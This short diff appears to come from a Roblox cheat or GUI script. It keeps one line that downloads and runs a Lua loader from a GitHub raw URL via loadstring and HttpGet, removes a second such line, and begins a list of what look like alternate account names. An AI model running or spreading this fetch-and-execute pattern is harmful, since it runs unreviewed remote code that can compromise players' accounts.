@@ -1,7 +1,5 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/gui_loader.lua"))()
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/GAG-SKULLS/refs/heads/main/spawning_gui.lua"))()
-
 users = {
     'ajandaa12alt1',
     'ajandaa12alt11',
